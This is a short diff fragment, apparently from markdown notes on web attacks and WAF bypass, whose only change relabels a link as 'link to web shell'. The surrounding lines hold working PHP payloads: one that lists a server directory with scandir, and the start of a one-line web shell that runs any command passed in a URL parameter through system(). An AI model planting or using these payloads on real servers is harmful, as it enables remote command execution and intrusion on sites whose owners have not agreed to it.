@@ -588,7 +588,7 @@ payalod=<?php $dir='.'; $file = scandir($dir); print_r($file); ?>
 >
 >[github waf](https://github.com/0xInfection/Awesome-WAF)
 >
->link to web
+>link to web shell 
 
 ```
 <?php system($_GET['cmd']);?
